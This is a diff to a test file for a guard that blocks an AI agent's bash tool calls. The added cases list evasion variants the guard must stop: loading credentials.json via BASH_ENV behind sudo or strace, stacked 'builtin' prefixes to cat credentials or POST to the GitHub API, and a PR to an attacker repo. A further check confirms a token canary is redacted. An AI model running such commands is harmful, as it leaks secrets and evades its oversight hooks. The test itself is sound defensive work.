@@ -44,10 +44,22 @@ test("Pi adapter blocks proven GH permission denials through its registered tool
       `gh pr -t "$${titleName}" create -b y -Rgithub.com/attacker/widgets`,
       "bash --rcfile credentials.json -ic true",
       "BASH_ENV=credentials.json bash -c true",
+      "sudo BASH_ENV=credentials.json bash -c true",
+      "strace --env=BASH_ENV=credentials.json bash -c true",
+      "builtin builtin command cat credentials.json",
+      "builtin builtin command gh api user -X POST",
+      "curl -X POST https://API.GITHUB.COM/repos/acme/widgets/pulls",
     ]) {
       const blocked = await handlers.get("tool_call")!({ toolName: "bash", toolCallId: command, input: { command } }, { ui: { notify() {} } });
       expect(blocked, command).toMatchObject({ block: true });
     }
+    const authCanary = "safety-core-auth-canary";
+    const redacted = await handlers.get("tool_call")!(
+      { toolName: "bash", toolCallId: "redacted-github-url", input: { command: `curl 'https://${authCanary}@API.GITHUB.COM/user?access_token=${authCanary}'` } },
+      { ui: { notify() {} } },
+    );
+    expect(redacted).toMatchObject({ block: true });
+    expect(JSON.stringify(redacted)).not.toContain(authCanary);
     let prompts = 0;
     const inheritedResult = await handlers.get("tool_call")!(
       { toolName: "bash", toolCallId: "inherited-test", input: { command: `$${runnerName} api user -X POST` } },
